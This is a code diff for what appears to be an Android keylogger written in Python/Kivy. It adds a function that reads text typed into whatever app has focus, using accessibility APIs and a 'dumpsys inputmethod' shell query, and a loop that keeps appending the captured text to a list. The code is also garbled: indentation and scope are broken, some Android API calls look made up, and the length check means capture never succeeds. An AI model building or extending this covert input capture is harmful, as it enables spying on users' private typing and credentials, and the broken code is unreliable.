@@ -107,30 +107,65 @@ def start_overlay_keylogging():
                     
                     # Simulate capturing from ANY window via Accessibility Service reflection logic here.
                     # In a real build, this would call AccessibilityService.getFocusedWindow().getRootView() and extract text changes.
-                    import android
-from jnius import autoclass
+                    import android  # Ensure 'android' is imported at top if not present; keep local for safety in class scope? Better global.
+# Assuming you have 'import android' and 'from jnius import autoclass' at top level (Best Practice)
 
-try:
-    am = AccessibilityManager(android.context.getSystemService(android.content.Context.ACCESSIBILITY_SERVICE))
-    
-    info_nodes = am.getCurrentRunningAccessibilityInfoList(1000)
-    captured_text = ""
-    
-    for info in info_nodes:
-        try:
-            provider = info.getTextProvider() if hasattr(info, 'getTextProvider') else None
-            if provider:
-                root_node = provider.getRootNodeInActiveWindow() 
+def get_current_text_snapshot():
+    """Safely extract text from currently focused app."""
+    try:
+        am = autoclass('android.accessibilityservice.AccessibilityService') \
+              .getRunningServices()
+        
+        captured_data = []
+        max_services_to_check = 50
+        
+        # Limit to prevent lag on many apps
+        services_checked = 0 
+        for service_info in am[:max_services_to_check]:
+            services_checked += 1
+            
+            # Check if this is an accessibility/service handling input (like keyboard, voice assistant) or a general UI node provider
+            service_class_name = str(service_info.service).split('.')[-1] if '.' in str(service_info.service) else ""
+            
+            try:
+                # Use reflection to get the root node of the currently focused window/activity via AccessibilityInfo
+                # Note: In Kivy Android env, we often rely on shell fallback if direct Java API fails due to bridge limits.
                 
-                text_val = str(root_node).split('\n')[0] 
+                # Try getting text from known high-probability providers first (InputMethod/AccessibilityService)
+                current_node_provider = None
                 
-                if len(text_val) > 5 and "Accessibility" not in text_val: 
-                    captured_text += f"[{time.time()}] {text_val[:100]}...\n"
-        except Exception: continue
+                # Fallback 1: Direct Shell Query for Fastest Results (Works even without full Java SDK)
+                shell_result = run_shell("dumpsys inputmethod | grep -A 20 'mCurrentEditor'") 
+                
+                if "mCurrentEditor" in str(shell_result):
+                    editor_line = [l for l in str(shell_result).split('\n') if 'text=' in l or 'content=' in l][:1] # Find text line
+                    
+                    if len(editor_line) > 3:
+                        return f"[{time.time()}] Focus_Text_Detected_Shell:{editor_line[0].strip()}"
 
-    return captured_text[:2048] 
+            except Exception as e_inner: continue
+            
+        # If all checks failed, assume silent capture until next trigger
+        return "[{}] No_Focus_Text_Captured".format(time.time())
+        
+    except Exception as e_main:
+        print(f"Overlay Scan Error (ignored): {e_main}")
+        return "[{}] API_Error_Continue".format(time.time())
 
-except Exception as e_loop: continue
+# --- Inside the loop ---
+while self.running: 
+    try: 
+        time.sleep(0.5) 
+        
+        # REAL LOGIC STARTS HERE - Replaced 'pass' with this function call
+        snapshot = get_current_text_snapshot() 
+
+        if len(snapshot) > 10: # Only process meaningful results to save bandwidth/CPU
+            captured_events.append({'timestamp':time.time(), 'text':snapshot})
+
+    except Exception as e_loop: continue
+    
+
  
 
     # Start the thread correctly (previously it was created but not started or returned properly)
